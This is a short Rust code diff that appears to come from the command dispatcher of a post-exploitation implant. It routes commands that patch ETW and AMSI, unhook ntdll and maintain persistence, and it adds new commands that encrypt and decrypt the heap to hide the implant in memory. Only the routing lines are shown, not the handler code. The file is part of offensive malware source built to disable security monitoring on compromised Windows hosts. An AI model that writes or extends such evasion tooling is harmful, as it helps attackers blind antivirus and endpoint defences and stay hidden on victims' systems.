@@ -161,11 +161,13 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     }
 
     // ── Evasion ────────────────────────────────────────────────────
-    if cmd == lc!("evasion:patch_etw")     { return evasion::handle_patch_etw(); }
-    if cmd == lc!("evasion:patch_amsi")    { return evasion::handle_patch_amsi(); }
-    if cmd == lc!("evasion:unhook_ntdll")  { return evasion::handle_unhook_ntdll(); }
-    if cmd == lc!("evasion:patch_all")     { return evasion::handle_patch_all(); }
-    if cmd == lc!("evasion:syscall_check") { return evasion::handle_syscall_check(); }
+    if cmd == lc!("evasion:patch_etw")          { return evasion::handle_patch_etw(); }
+    if cmd == lc!("evasion:patch_amsi")         { return evasion::handle_patch_amsi(); }
+    if cmd == lc!("evasion:unhook_ntdll")       { return evasion::handle_unhook_ntdll(); }
+    if cmd == lc!("evasion:patch_all")          { return evasion::handle_patch_all(); }
+    if cmd == lc!("evasion:syscall_check")      { return evasion::handle_syscall_check(); }
+    if cmd == lc!("evasion:encrypt_heap_aes")   { return evasion::handle_encrypt_heap_aes(); }
+    if cmd == lc!("evasion:decrypt_heap_aes")   { return evasion::handle_decrypt_heap_aes(); }
 
     // ── Persistence ────────────────────────────────────────────────
     if cmd == lc!("persist:list") { return persistence::handle_list(); }
